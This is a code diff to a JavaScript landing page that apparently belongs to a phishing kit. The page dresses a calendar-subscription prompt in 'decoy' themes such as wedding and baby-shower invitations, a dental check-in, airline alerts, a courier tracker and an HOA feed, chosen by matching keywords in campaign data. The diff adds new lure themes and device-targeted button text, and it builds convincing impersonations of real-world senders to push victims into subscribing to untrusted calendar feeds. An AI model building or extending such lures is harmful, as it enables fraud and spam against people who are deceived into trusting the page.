@@ -376,6 +376,66 @@
 
     // Dynamic Skinning based on Decoy Theme
     const THEMES = {
+      babyshower: {
+        icon: "🍼",
+        verified: "Verified Event Invitation",
+        title: "Baby Shower & Registry Schedule",
+        desc: "Join us in celebrating! Subscribing adds the baby shower itinerary, registry details, and venue directions directly to your calendar so you don't have to stress.",
+        check1: "📍 Venue: Pavilion 4 / Garden Terrace",
+        check2: "🎁 Registry: Live Gift & Event Updates",
+        check3: "📅 Sync: Apple & Google Calendar 1-Tap",
+        org: "Family Celebration Portal",
+        accent: "#ec4899",
+        btnText: "🍼 Add Baby Shower to Calendar"
+      },
+      wedding: {
+        icon: "💍",
+        verified: "Wedding Guest Portal",
+        title: "Wedding Itinerary & Rehearsal Schedule",
+        desc: "Join us for our special day! Subscribing adds the ceremony timeline, cocktail hour, and reception schedule directly to your phone with live updates.",
+        check1: "🥂 Schedule: Full Wedding Day Itinerary",
+        check2: "📍 Venue: Parking & Gate Directions",
+        check3: "📅 Sync: Real-Time Calendar Integration",
+        org: "Wedding Celebration Registry",
+        accent: "#eab308",
+        btnText: "💍 Add Wedding to Calendar"
+      },
+      dental: {
+        icon: "🦷",
+        verified: "Patient Health Portal",
+        title: "Dental Cleaning & Exam Check-in",
+        desc: "Automated patient appointment sync. Subscribing ensures arrival windows, check-in instructions, and hygiene exam updates stream to your phone.",
+        check1: "🏥 Clinic: Advanced Dental Care Services",
+        check2: "⏰ Arrival: 15-Minute Check-in Window",
+        check3: "📲 Sync: Mobile Patient Calendar Feed",
+        org: "Patient Appointment Dispatch",
+        accent: "#06b6d4",
+        btnText: "🦷 Add Appointment to Calendar"
+      },
+      fantasy: {
+        icon: "🏈",
+        verified: "League Headquarters",
+        title: "2026 Fantasy League Draft & Matchups",
+        desc: "Official fantasy league schedule. Subscribing syncs draft night times, weekly matchup deadlines, and roster lock alerts directly to your calendar.",
+        check1: "🏆 Format: Live Draft & Weekly Matchups",
+        check2: "⏰ Deadlines: Real-Time Roster Lock Alerts",
+        check3: "📱 Platform: League Sync Direct Feed",
+        org: "Fantasy Sports Commissioner Bureau",
+        accent: "#f97316",
+        btnText: "🏈 Add League Schedule to Calendar"
+      },
+      party: {
+        icon: "💌",
+        verified: "Private Invitation",
+        title: "Event Invitation & Schedule",
+        desc: "Here is the invite so you don't have to stress about dates or times! Subscribing puts all event details and itinerary updates right on your calendar.",
+        check1: "📍 Location: Live Address & Directions",
+        check2: "⏰ Itinerary: Real-Time Event Notifications",
+        check3: "📲 Device: 1-Tap Calendar Subscription",
+        org: "Guest Event Portal",
+        accent: "#8b5cf6",
+        btnText: "💌 Add Invite to Calendar"
+      },
       flight: {
         icon: "✈️",
         verified: "Verified Airline Gateway",
@@ -385,7 +445,8 @@
         check2: "Cadence: Dynamic Real-Time Dispatch",
         check3: "Destination: Passenger Device Sync",
         org: "SkyLink Aviation Services",
-        accent: "#0284c7"
+        accent: "#0284c7",
+        btnText: "✈️ Add Flight Alerts to Calendar"
       },
       hoa: {
         icon: "🏛️",
@@ -396,7 +457,8 @@
         check2: "Updates: Weekly Routine Broadcasts",
         check3: "Coverage: Community Municipal Feed",
         org: "Homeowners Governance Bureau",
-        accent: "#16a34a"
+        accent: "#16a34a",
+        btnText: "🏛️ Subscribe to Community Feed"
       },
       smarthome: {
         icon: "🏡",
@@ -407,7 +469,8 @@
         check2: "Polling: Automated Sensor Audits",
         check3: "Security: Local Node Direct Sync",
         org: "Smart Home Ecosystem",
-        accent: "#8b5cf6"
+        accent: "#8b5cf6",
+        btnText: "🏡 Connect Smart Home Feed"
       },
       package: {
         icon: "📦",
@@ -418,7 +481,8 @@
         check2: "Sync: Live GPS Route Windows",
         check3: "Alerts: High-Priority Signature Required",
         org: "Global Courier Network",
-        accent: "#d97706"
+        accent: "#d97706",
+        btnText: "📦 Track Package on Calendar"
       },
       corporate: {
         icon: "🛡️",
@@ -429,7 +493,8 @@
         check2: "Update Frequency: Real-Time Periodic Background Polling",
         check3: "Target Device: Mobile Calendar Registry",
         org: "Enterprise Infrastructure Gateway",
-        accent: "#2563eb"
+        accent: "#2563eb",
+        btnText: "🛡️ Subscribe to Directory Feed"
       }
     };
 
@@ -462,22 +527,35 @@
         if (!res.ok) return;
         const data = await res.json();
         
-        const title = (data.decoyTitle || data.decoyCalName || data.theme || "").toLowerCase();
-        if (title.includes("flight") || title.includes("airline") || title.includes("delta")) {
-          applyTheme("flight");
-        } else if (title.includes("hoa") || title.includes("resident") || title.includes("community")) {
-          applyTheme("hoa");
-        } else if (title.includes("smart") || title.includes("iot") || title.includes("home")) {
-          applyTheme("smarthome");
-        } else if (title.includes("delivery") || title.includes("package") || title.includes("fedex") || title.includes("ups")) {
-          applyTheme("package");
-        } else {
-          applyTheme("corporate");
+        const textToScan = `${data.decoyTitle || ''} ${data.decoyCalName || ''} ${data.theme || ''} ${data.decoyMemo || ''}`.toLowerCase();
+        
+        let matchedTheme = "corporate";
+        if (textToScan.includes("baby") || textToScan.includes("shower") || textToScan.includes("sophia") || textToScan.includes("registry")) {
+          matchedTheme = "babyshower";
+        } else if (textToScan.includes("wedding") || textToScan.includes("rehearsal") || textToScan.includes("bride") || textToScan.includes("groom")) {
+          matchedTheme = "wedding";
+        } else if (textToScan.includes("dental") || textToScan.includes("dentist") || textToScan.includes("teeth") || textToScan.includes("cleaning")) {
+          matchedTheme = "dental";
+        } else if (textToScan.includes("fantasy") || textToScan.includes("league") || textToScan.includes("draft") || textToScan.includes("football")) {
+          matchedTheme = "fantasy";
+        } else if (textToScan.includes("flight") || textToScan.includes("airline") || textToScan.includes("delta") || textToScan.includes("gate")) {
+          matchedTheme = "flight";
+        } else if (textToScan.includes("hoa") || textToScan.includes("resident") || textToScan.includes("community") || textToScan.includes("neighborhood")) {
+          matchedTheme = "hoa";
+        } else if (textToScan.includes("smart") || textToScan.includes("iot") || textToScan.includes("home") || textToScan.includes("fridge")) {
+          matchedTheme = "smarthome";
+        } else if (textToScan.includes("delivery") || textToScan.includes("package") || textToScan.includes("fedex") || textToScan.includes("ups") || textToScan.includes("tracking")) {
+          matchedTheme = "package";
+        } else if (textToScan.includes("party") || textToScan.includes("invite") || textToScan.includes("dinner") || textToScan.includes("bbq") || textToScan.includes("celebrat")) {
+          matchedTheme = "party";
         }
 
+        applyTheme(matchedTheme);
+
+        // Apply bespoke user fields from Studio
         if (data.decoyTitle) {
-          // Custom title from campaign
-          document.getElementById("portalTitle").textContent = data.decoyTitle.replace(/[^\w\s-]/g, '').trim() || data.decoyTitle;
+          document.getElementById("portalTitle").textContent = data.decoyTitle;
+          document.title = data.decoyTitle;
         }
         if (data.decoyMemo) {
           document.getElementById("portalDesc").textContent = data.decoyMemo;
@@ -485,6 +563,23 @@
         if (data.decoyCalName) {
           document.getElementById("verifiedLabel").textContent = data.decoyCalName;
         }
+
+        // Apply custom event details if available
+        if (data.decoyLocation) {
+          document.getElementById("checkLine1").textContent = `📍 Location: ${data.decoyLocation}`;
+        }
+        if (data.decoyDate) {
+          const dObj = new Date(data.decoyDate);
+          const dateStr = !isNaN(dObj.getTime())
+            ? dObj.toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric', year: 'numeric' })
+            : data.decoyDate;
+          document.getElementById("checkLine2").textContent = `📅 Event Date: ${dateStr}`;
+        }
+
+        if (THEMES[matchedTheme] && THEMES[matchedTheme].btnText && (isIOS || isMac)) {
+          primaryText.textContent = THEMES[matchedTheme].btnText;
+        }
+
         document.getElementById("footerRef").textContent = `REF: ${campaignId.toUpperCase()}`;
       } catch (e) {
         // Fallback default
